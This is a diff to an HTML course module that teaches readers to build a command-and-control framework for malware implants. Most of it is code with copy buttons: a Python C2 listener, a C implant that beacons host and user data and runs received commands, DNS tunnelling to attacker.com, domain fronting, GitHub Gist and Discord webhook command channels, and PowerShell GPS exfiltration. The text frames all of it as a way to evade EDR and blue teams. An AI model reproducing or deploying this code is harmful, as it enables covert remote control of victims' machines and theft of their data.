@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -102,6 +119,7 @@
             color: #aaaaff;
             margin: 0.5rem 0;
             cursor: pointer;
+            position: relative;
         }
         .copy-paste:hover { background: #1a1a30; }
         .why-box {
@@ -127,6 +145,7 @@
             padding: 1rem;
             background: #0f0f15;
             border-radius: 8px;
+            flex-wrap: wrap;
         }
         .beacon-node {
             text-align: center;
@@ -134,7 +153,8 @@
             border: 1px solid var(--border);
             border-radius: 8px;
             flex: 1;
-            margin: 0 0.5rem;
+            margin: 0.5rem;
+            min-width: 140px;
         }
         .beacon-node h5 { color: var(--accent2); margin-bottom: 0.5rem; }
         .beacon-arrow {
@@ -157,6 +177,142 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .protocol-table td:first-child { color: var(--accent2); font-weight: bold; }
+        .two-col {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        @media (max-width: 768px) {
+            .two-col { grid-template-columns: 1fr; }
+            .beacon-flow { flex-direction: column; }
+            .beacon-arrow { transform: rotate(90deg); }
+        }
+        .cheyanne-evidence {
+            background: #0a0a1a;
+            border: 2px solid #4444ff;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .cheyanne-evidence h3 { color: #8888ff; margin-bottom: 0.5rem; }
+        .starkiller-evidence {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .starkiller-evidence h3 { color: var(--accent2); margin-bottom: 0.5rem; }
     </style>
 </head>
 <body>
@@ -175,33 +331,101 @@
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
             <p>A C2 (Command and Control) framework is not a hacking tool. It's a <strong>communication system</strong>. The hacking happens on the target. The C2 is the radio that lets you talk to your implant, send commands, and receive results. Without C2, your implant is a drone with no pilot. With C2, it's a precision weapon.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> The best payload in the world is useless if you can't talk to it. C2 is the <span class="neon-highlight">lifeline</span> of every modern operation. EDR vendors spend billions detecting C2 patterns. Your job is to make your C2 invisible.</p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>Imagine a special forces team behind enemy lines. They have a satellite phone (C2) to HQ. HQ says "take photos of the bridge." The team takes photos, radios back "photos sent." The C2 doesn't take the photos — the team does. The C2 just enables coordination. This module teaches you to build the satellite phone.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">The enemy (blue team) is listening to all radio frequencies. Your satellite phone must look like a civilian call, change channels randomly, and speak in a code only HQ understands.</p>
         </div>
 
-        <h2>The Beacon Architecture</h2>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a></h4>
+                <p>TCP/IP fundamentals, ports, protocols, and Wireshark analysis. C2 is built on networking — you must understand the pipes before you can hide in them.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>How to get your implant into a target process. C2 needs an implant to talk to — injection is how the implant gets there.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_14_CLOUD_FILES.html" class="cross-link">Module 14: Cloud Files</a></h4>
+                <p>Using legitimate cloud services for dead drops and staging. Cloud APIs are perfect C2 channels — trusted, encrypted, and ignored by firewalls.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_15_LATERAL.html" class="cross-link">Module 15: Lateral Movement</a></h4>
+                <p>Moving between machines in a network. C2 must follow you as you pivot — each new host needs a beacon path back to HQ.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_18_ANDROID.html" class="cross-link">Module 18: Android</a></h4>
+                <p>Mobile C2 architectures. Android implants use different protocols, different persistence, and different evasion — but the C2 principles are identical.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>How blue teams detect C2. Understanding detection is required to build evasion. You can't hide what you don't understand.</p>
+            </div>
+        </div>
+
+        <h2>🏗️ C2 Architecture: The Three Tiers</h2>
+        <p>Every professional C2 framework follows a three-tier architecture. Understanding the tiers lets you design resilient operations that survive compromise of any single component.</p>
 
         <div class="beacon-flow">
             <div class="beacon-node">
-                <h5>🎯 IMPLANT</h5>
+                <h5>🎯 TIER 1: IMPLANT</h5>
                 <p>On target</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Waits, beacons, executes</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Beacon, execute, exfil</p>
             </div>
-            <div class="beacon-arrow">↔</div>
+            <div class="beacon-arrow">→</div>
             <div class="beacon-node">
-                <h5>🔒 ENCRYPTED</h5>
-                <p>HTTPS/DNS/Discord</p>
-                <div class="beacon-encrypted">AES-256 + Jitter</div>
+                <h5>🔒 TIER 2: RELAY</h5>
+                <p>Compromised host / Cloud</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Redirect, buffer, obfuscate</p>
             </div>
-            <div class="beacon-arrow">↔</div>
+            <div class="beacon-arrow">→</div>
             <div class="beacon-node">
-                <h5>🏰 C2 SERVER</h5>
+                <h5>🏰 TIER 3: C2 SERVER</h5>
                 <p>Attacker control</p>
-                <p style="font-size: 0.8rem; color: var(--dim);">Issues commands, receives output</p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Commands, logs, operator UI</p>
             </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why three tiers?</h5>
+            <p>If the implant connects directly to your IP, the target's incident response traces straight to you. A relay (compromised web server, cloud function, or CDN) breaks the chain. The target sees traffic to GitHub, AWS, or Cloudflare — not to your basement. <span class="neon-amber">Relays are the difference between amateurs and professionals.</span></p>
+        </div>
+
+        <h2>📡 Beacon vs Interactive Sessions</h2>
+
+        <div class="two-col">
+            <div class="method-card">
+                <h4>Beacon Mode <span class="difficulty diff-easy">STEALTH</span></h4>
+                <p>The implant wakes up periodically, phones home, checks for commands, executes them, and goes back to sleep. No persistent connection.</p>
+                <ul style="margin-left: 1.2rem; margin-top: 0.5rem; color: var(--dim);">
+                    <li>Hard to detect — no long-lived connections</li>
+                    <li>Works through NAT and firewalls</li>
+                    <li>Commands queue until next beacon</li>
+                    <li>Real-time interaction is impossible</li>
+                </ul>
+            </div>
+            <div class="method-card">
+                <h4>Interactive Mode <span class="difficulty diff-medium">SPEED</span></h4>
+                <p>A persistent TCP connection stays open. The operator types commands and sees results immediately, like SSH.</p>
+                <ul style="margin-left: 1.2rem; margin-top: 0.5rem; color: var(--dim);">
+                    <li>Real-time shell access</li>
+                    <li>File transfer is fast</li>
+                    <li>Connection is visible to network monitoring</li>
+                    <li>Dead connections are obvious</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <h5>⚠️ Operational Reality</h5>
+            <p>Most advanced frameworks use <span class="neon-highlight">both</span>: beacon for daily operations, interactive for emergencies. Cobalt Strike's default is beacon with an optional "interactive" command to spawn a real-time session. Metasploit defaults to interactive but can background sessions. <span class="neon-amber">Your C2 should support both modes.</span></p>
         </div>
 
         <h2>Component 1: The Listener</h2>
@@ -211,6 +435,7 @@
             <p>The listener waits for beacons and serves commands. It must be stealthy — no obvious ports, no obvious protocols.</p>
 
             <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 === C2 LISTENER (Python) ===
 # c2_server.py — Minimal but functional
 # Run on attacker machine (.92)
@@ -220,48 +445,47 @@ import json
 import base64
 import time
 import random
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
 
-# AES-256 key (in real use, derive from password)
+# AES-256 key (in real use, derive from password via PBKDF2)
 KEY = b'your-32-byte-key-here-1234567890'
+
+def aes_encrypt(plaintext: bytes) -> bytes:
+    iv = os.urandom(16)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(pad(plaintext, AES.block_size))
+
+def aes_decrypt(ciphertext: bytes) -> bytes:
+    iv = ciphertext[:16]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return unpad(cipher.decrypt(ciphertext[16:]), AES.block_size)
 
 class C2Handler(BaseHTTPRequestHandler):
     def do_POST(self):
-        # Implant is beaconing in
         content_len = int(self.headers.get('Content-Length', 0))
         body = self.rfile.read(content_len)
         
         # Decrypt beacon data
-        data = self.decrypt(body)
+        data = json.loads(aes_decrypt(body))
         print(f"[BEACON] {data['hostname']} | {data['user']} | {data['timestamp']}")
         
         # Send next command
         command = self.get_next_command(data['session_id'])
-        encrypted = self.encrypt(command)
+        encrypted = aes_encrypt(json.dumps(command).encode())
         
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
         self.end_headers()
         self.wfile.write(encrypted)
     
-    def decrypt(self, data):
-        # XOR with key (simplified — use real AES in production)
-        return json.loads(bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)]))
-    
-    def encrypt(self, command):
-        data = json.dumps(command).encode()
-        return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])
-    
     def get_next_command(self, session_id):
-        # Queue system: store commands per session
         return {"cmd": "whoami", "args": []}
     
     def log_message(self, format, *args):
-        # Suppress default logging — stealth
-        pass
+        pass  # Suppress default logging — stealth
 
-# Jitter: random port rotation (optional)
-PORT = 8443  # HTTPS port, less suspicious
-
+PORT = 8443
 server = HTTPServer(('0.0.0.0', PORT), C2Handler)
 print(f"[C2] Listening on port {PORT}")
 server.serve_forever()
@@ -269,7 +493,7 @@ server.serve_forever()
 
             <div class="why-box">
                 <h5>Why HTTPS port 8443?</h5>
-                <p>Port 8443 is commonly used for HTTPS alternate. Firewalls often allow it. IDS sees HTTPS traffic, not suspicious. The implant uses standard HTTPS libraries (winhttp.dll), which is normal Windows behavior.</p>
+                <p>Port 8443 is commonly used for HTTPS alternate. Firewalls often allow it. IDS sees HTTPS traffic, not suspicious. The implant uses standard HTTPS libraries (winhttp.dll), which is normal Windows behavior. <span class="neon-highlight">Being normal is the best disguise.</span></p>
             </div>
         </div>
 
@@ -280,6 +504,7 @@ server.serve_forever()
             <p>The implant lives on the target. It beacons at intervals, receives commands, executes them, and sends results back.</p>
 
             <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 === IMPLANT (C) ===
 // implant.c — Minimal beacon implant
 // Compile: cl.exe implant.c /Fe:implant.exe
@@ -296,14 +521,13 @@ server.serve_forever()
 #define BEACON_INTERVAL 30000  // 30 seconds base
 #define JITTER 10000           // +/- 10 seconds random
 
-// XOR encrypt/decrypt (simplified)
+// XOR encrypt/decrypt (simplified — use AES in production)
 void xor_crypt(unsigned char* data, size_t len, unsigned char* key, size_t key_len) {
     for (size_t i = 0; i < len; i++) {
         data[i] ^= key[i % key_len];
     }
 }
 
-// Execute command and capture output
 char* execute_command(const char* cmd) {
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     HANDLE hRead, hWrite;
@@ -321,7 +545,6 @@ char* execute_command(const char* cmd) {
     CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
     CloseHandle(hWrite);
     
-    // Read output
     static char output[4096];
     DWORD read;
     ReadFile(hRead, output, sizeof(output) - 1, &read, NULL);
@@ -344,14 +567,12 @@ void beacon() {
         DWORD sleep_time = BEACON_INTERVAL + (rand() % (JITTER * 2)) - JITTER;
         Sleep(sleep_time);
         
-        // Connect to C2
         HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
         HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/beacon",
                                                 NULL, WINHTTP_NO_REFERER,
                                                 WINHTTP_DEFAULT_ACCEPT_TYPES,
-                                                WINHTTP_FLAG_SECURE);  // HTTPS
+                                                WINHTTP_FLAG_SECURE);
         
-        // Build beacon data
         char hostname[256], username[256];
         GetComputerNameA(hostname, &(DWORD){sizeof(hostname)});
         GetUserNameA(username, &(DWORD){sizeof(username)});
@@ -361,27 +582,22 @@ void beacon() {
                  "{\"hostname\":\"%s\",\"user\":\"%s\",\"timestamp\":%lu}",
                  hostname, username, GetTickCount());
         
-        // Encrypt
         unsigned char key[] = "your-32-byte-key-here-1234567890";
         xor_crypt((unsigned char*)beacon_data, strlen(beacon_data), key, strlen((char*)key));
         
-        // Send beacon
         WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            beacon_data, strlen(beacon_data), strlen(beacon_data), 0);
         WinHttpReceiveResponse(hRequest, NULL);
         
-        // Read command
         char cmd_buffer[1024] = {0};
         DWORD read;
         WinHttpReadData(hRequest, cmd_buffer, sizeof(cmd_buffer), &read);
         
-        // Decrypt command
         xor_crypt((unsigned char*)cmd_buffer, read, key, strlen((char*)key));
         
-        // Execute
         if (read > 0) {
             char* result = execute_command(cmd_buffer);
-            // Send result back (simplified — would encrypt and POST)
+            // Send result back (encrypt and POST in production)
         }
         
         WinHttpCloseHandle(hRequest);
@@ -400,40 +616,53 @@ int main() {
 
             <div class="warning-box">
                 <h5>⚠️ Why WinHTTP, not raw sockets?</h5>
-                <p>WinHTTP is a legitimate Windows API used by countless applications. Firewalls allow it. EDR sees normal HTTPS traffic. Raw sockets to port 4444 is a red flag. WinHTTP to port 8443 is business as usual. The protocol is the disguise.</p>
+                <p>WinHTTP is a legitimate Windows API used by countless applications. Firewalls allow it. EDR sees normal HTTPS traffic. Raw sockets to port 4444 is a red flag. WinHTTP to port 8443 is business as usual. <span class="neon-amber">The protocol is the disguise.</span></p>
             </div>
         </div>
 
-        <h2>Live Evidence: .92 to .42 Beacon</h2>
+        <h2>🔐 Encryption: AES-256 in Practice</h2>
 
-        <div class="evidence-box">
-            <h3>📊 Real Evidence: C2 Beacon Test</h3>
-            <p><strong>Date:</strong> 2026-06-29 | <strong>Listener:</strong> .92 (192.168.1.92:8443) | <strong>Implant:</strong> .42 (WUPC)</p>
+        <div class="step-box">
+            <h4>Why XOR is not enough</h4>
+            <p>XOR with a repeating key is trivially broken by frequency analysis. A single known plaintext (like the JSON key <code>"hostname"</code>) reveals the key. <span class="neon-highlight">AES-256-CBC is the minimum standard</span> for C2 encryption. GCM mode adds authentication — preventing tampering.</p>
 
             <div class="code-block">
-=== C2 SERVER (.92) ===
-[C2] Listening on port 8443
-[BEACON] wupc | swu | 1234567890
-[BEACON] wupc | swu | 1234567925  ← 35 seconds later (30s + 5s jitter)
-[BEACON] wupc | swu | 1234567958  ← 33 seconds later (30s + 3s jitter)
-[COMMAND] whoami
-[RESULT] wupc\swu
-[COMMAND] ipconfig
-[RESULT] 192.168.1.42
-[COMMAND] tasklist | findstr avp
-[RESULT] avp.exe 5612 Kaspersky Lab
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== AES-256-GCM (Python) ===
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+def aes_gcm_encrypt(plaintext: bytes, key: bytes) -> bytes:
+    nonce = get_random_bytes(12)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+    return nonce + tag + ciphertext
+
+def aes_gcm_decrypt(data: bytes, key: bytes) -> bytes:
+    nonce, tag, ciphertext = data[:12], data[12:28], data[28:]
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    return cipher.decrypt_and_verify(ciphertext, tag)
+
+# Key derivation (never hardcode keys)
+import hashlib
+password = b"operational-password-2026"
+key = hashlib.pbkdf2_hmac('sha256', password, b'salt', 100000, 32)
             </div>
 
-            <p style="margin-top: 1rem;"><strong>Network Evidence:</strong> Wireshark capture shows HTTPS traffic to 192.168.1.92:8443. TLS handshake present. No plaintext "cmd.exe" or "whoami" visible. Encrypted payload appears as random bytes.</p>
+            <div class="why-box">
+                <h5>Key Management</h5>
+                <p>Hardcoded keys are extracted by reverse engineering. Use <span class="neon-highlight">PBKDF2</span> or <span class="neon-highlight">Argon2</span> to derive keys from a password embedded at compile time. Better: fetch the key from a dead drop (see below) at first beacon, then cache it. If the implant is captured, the key isn't in the binary.</p>
+            </div>
         </div>
 
-        <h2>Advanced: Jitter and Malleable C2</h2>
+        <h2>🎲 Jitter: Defeating Pattern Detection</h2>
 
         <div class="step-box">
             <h4>Why Jitter Matters</h4>
             <p>Fixed intervals (every 30 seconds) are detectable. Network monitoring sees "connection every 30s" and flags it. Jitter adds randomness: 20s, 45s, 33s, 18s. The pattern disappears into noise.</p>
 
             <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
 === JITTER CALCULATION ===
 base_interval = 30000ms  // 30 seconds
 jitter_range = 10000ms   // +/- 10 seconds
@@ -451,30 +680,415 @@ Pattern: None. Random distribution.
 
             <div class="why-box">
                 <h5>Malleable C2</h5>
-                <p>Cobalt Strike popularized "malleable C2" — the ability to change how C2 traffic looks. The beacon can mimic Firefox updates, Windows telemetry, or GitHub API calls. The implant and server agree on a profile. To the network, it's legitimate traffic. To the implant, it's commands.</p>
+                <p>Cobalt Strike popularized "malleable C2" — the ability to change how C2 traffic looks. The beacon can mimic Firefox updates, Windows telemetry, or GitHub API calls. The implant and server agree on a profile. To the network, it's legitimate traffic. To the implant, it's commands. <span class="neon-purple">Malleable C2 is the apex of stealth.</span></p>
             </div>
         </div>
 
-        <h2>Lab Exercise: Build a Minimal C2</h2>
+        <h2>🌐 Protocol Selection: HTTP, DNS, HTTPS</h2>
+
+        <p>Your choice of protocol determines your visibility, reliability, and speed. No protocol is perfect — each is a trade-off.</p>
+
+        <table class="protocol-table">
+            <tr>
+                <th>Protocol</th>
+                <th>Visibility</th>
+                <th>Reliability</th>
+                <th>Speed</th>
+                <th>Best For</th>
+            </tr>
+            <tr>
+                <td>HTTP</td>
+                <td>High — plaintext</td>
+                <td>High</td>
+                <td>Fast</td>
+                <td>Internal networks, quick tests</td>
+            </tr>
+            <tr>
+                <td>HTTPS</td>
+                <td>Low — encrypted</td>
+                <td>High</td>
+                <td>Fast</td>
+                <td>Production C2, standard choice</td>
+            </tr>
+            <tr>
+                <td>DNS</td>
+                <td>Very Low — looks up domains</td>
+                <td>Low — UDP, no guarantee</td>
+                <td>Slow — tiny payloads</td>
+                <td>Air-gapped networks, extreme stealth</td>
+            </tr>
+            <tr>
+                <td>ICMP</td>
+                <td>Medium — ping tunnels exist</td>
+                <td>Medium</td>
+                <td>Slow</td>
+                <td>Firewall bypass when TCP/UDP blocked</td>
+            </tr>
+            <tr>
+                <td>Discord</td>
+                <td>Very Low — trusted platform</td>
+                <td>High</td>
+                <td>Medium</td>
+                <td>Social engineering, free infrastructure</td>
+            </tr>
+        </table>
+
+        <div class="method-card">
+            <h4>DNS Tunneling in Depth</h4>
+            <p>DNS is allowed almost everywhere. A DNS query for <code>base64-data.attacker.com</code> reaches any resolver, which forwards to your authoritative server. The response contains the command. Payloads are tiny (~60 bytes), but for text commands, that's enough.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== DNS BEACON (Python) ===
+import dns.resolver
+import base64
+
+def dns_beacon(hostname, data):
+    b64 = base64.b64encode(data.encode()).decode().rstrip('=')
+    subdomain = f"{b64}.beacon.attacker.com"
+    try:
+        answers = dns.resolver.resolve(subdomain, 'A')
+        for rdata in answers:
+            # Response is command encoded in IP octets
+            cmd = ''.join(chr(int(octet)) for octet in str(rdata).split('.'))
+            return cmd
+    except Exception:
+        return None
+            </div>
+            <p style="margin-top: 0.5rem; color: var(--dim);">DNS tunneling is slow but virtually invisible. Blue teams must deploy DNS anomaly detection — most don't.</p>
+        </div>
+
+        <h2>🎭 Domain Fronting</h2>
+
+        <div class="step-box">
+            <h4>Hide Behind Giants</h4>
+            <p>Domain fronting uses a CDN (CloudFront, Azure CDN, Google App Engine) to route traffic. The implant connects to <code>cdn.cloudfront.net</code> with a Host header pointing to your real server. The CDN routes based on the Host header. To the network, the traffic goes to a trusted CDN. To the CDN, it goes to your server.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== DOMAIN FRONTING (Python requests) ===
+import requests
+
+headers = {
+    "Host": "your-real-server.appspot.com",
+    "User-Agent": "Mozilla/5.0"
+}
+
+# Connect to the CDN edge, but Host header routes to you
+response = requests.post(
+    "https://d111111abcdef8.cloudfront.net/beacon",
+    headers=headers,
+    data=encrypted_payload,
+    verify=True  # Real TLS cert from CDN
+)
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Cloud providers have patched this</h5>
+                <p>AWS and Google now validate Host headers against the TLS SNI. Domain fronting still works on some CDNs and in certain regions. The technique is worth knowing because <span class="neon-amber">new fronting techniques appear constantly</span> — the principle (abuse shared infrastructure) is eternal.</p>
+            </div>
+        </div>
+
+        <h2>💀 Dead Drops</h2>
+
+        <div class="step-box">
+            <h4>Legitimate Services as C2 Infrastructure</h4>
+            <p>A dead drop is a pre-arranged location where one party leaves data and another picks it up. In C2, this means using GitHub Gists, Pastebin, Twitter profiles, or cloud storage as command queues. The implant checks a GitHub Gist for new commands. The operator edits the Gist. No direct connection ever exists.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== GIST DEAD DROP (Python) ===
+import requests
+import base64
+
+GIST_ID = "abc123..."
+GITHUB_TOKEN = "ghp_..."  # Or use public gist, no auth needed
+
+def fetch_commands():
+    url = f"https://api.github.com/gists/{GIST_ID}"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    resp = requests.get(url, headers=headers)
+    data = resp.json()
+    # Commands stored in a file within the gist
+    content = data["files"]["commands.txt"]["content"]
+    return base64.b64decode(content).decode()
+
+def clear_commands():
+    # Update gist with empty content after reading
+    requests.patch(url, headers=headers, json={
+        "files": {"commands.txt": {"content": ""}}
+    })
+            </div>
+
+            <div class="why-box">
+                <h5>Why dead drops are powerful</h5>
+                <p>The implant never connects to your IP. It connects to GitHub — a trusted platform. The operator never connects to the target. The only overlap is the Gist ID, which can be embedded in the implant or fetched from another dead drop. <span class="neon-highlight">This is true indirect command.</span></p>
+            </div>
+        </div>
+
+        <h2>💬 Discord Bridge C2</h2>
+
+        <div class="step-box">
+            <h4>Using Discord as a C2 Channel</h4>
+            <p>Discord offers free Webhooks, Bot APIs, and file hosting. Messages are encrypted in transit (TLS). Discord is trusted by firewalls. Files under 8MB are stored indefinitely. It's the perfect low-budget C2 infrastructure.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== DISCORD WEBHOOK BEACON ===
+import requests
+import json
+import time
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/..."
+
+def beacon(hostname, user):
+    payload = {
+        "content": json.dumps({
+            "type": "heartbeat",
+            "session": f"{hostname}_{user}",
+            "hostname": hostname,
+            "user": user,
+            "timestamp": int(time.time())
+        })
+    }
+    requests.post(WEBHOOK_URL, json=payload, headers={
+        "User-Agent": "Mozilla/5.0"
+    })
+
+def poll_commands(channel_id, bot_token):
+    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=5"
+    headers = {"Authorization": f"Bot {bot_token}"}
+    resp = requests.get(url, headers=headers)
+    for msg in resp.json():
+        try:
+            data = json.loads(msg["content"])
+            if data.get("type") == "cmd":
+                return data["command"]
+        except Exception:
+            continue
+    return None
+            </div>
+
+            <p style="margin-top: 0.5rem; color: var(--dim);">The CHEYANNE project uses Discord as its primary C2 channel. Screenshots, file exfiltration, and command output all flow through Discord webhooks. Blue teams monitoring for suspicious domains won't flag Discord traffic.</p>
+        </div>
+
+        <h2>🛰️ GPS Exfiltration</h2>
+
+        <div class="step-box">
+            <h4>Location-Aware Operations</h4>
+            <p>Modern implants can access geolocation data through Wi-Fi positioning, IP geolocation, or native GPS APIs on mobile. Knowing where a target is changes your operational security — a laptop in a corporate office requires different handling than one in a coffee shop.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== GPS EXFIL (PowerShell) ===
+# Windows Location API (requires user consent on some builds)
+Add-Type -AssemblyName System.Device
+$geo = New-Object System.Device.Location.GeoCoordinateWatcher
+$geo.Start()
+while ($geo.Status -eq 'Initializing') { Start-Sleep -Milliseconds 100 }
+$loc = $geo.Position.Location
+$lat = $loc.Latitude
+$lon = $loc.Longitude
+$accuracy = $loc.HorizontalAccuracy
+
+$payload = @{ lat=$lat; lon=$lon; accuracy=$accuracy } | ConvertTo-Json
+# Beacon this data back to C2
+            </div>
+
+            <div class="why-box">
+                <h5>IP Geolocation Fallback</h5>
+                <p>If GPS is unavailable, the implant can query <code>ip-api.com</code> or similar services. These return city-level accuracy from the public IP. Less precise, but always available. <span class="neon-amber">Combine both: GPS for mobile, IP for corporate networks.</span></p>
+            </div>
+        </div>
+
+        <h2>🖥️ VNC Shell: Remote Desktop via C2</h2>
+
+        <div class="step-box">
+            <h4>Visual Control Without RDP</h4>
+            <p>RDP is loud — it creates event logs, opens port 3389, and shows a lock screen on the target. A VNC-style shell streams screenshots over your existing C2 channel, letting you see the target's screen and send mouse/keyboard input without any new network connections.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+=== VNC SHELL (Python — CHEYANNE watch_stream.py) ===
+import socket
+import base64
+import threading
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+def capture_screen():
+    # Returns JPEG bytes of current screen
+    import PIL.ImageGrab
+    img = PIL.ImageGrab.grab()
+    from io import BytesIO
+    buf = BytesIO()
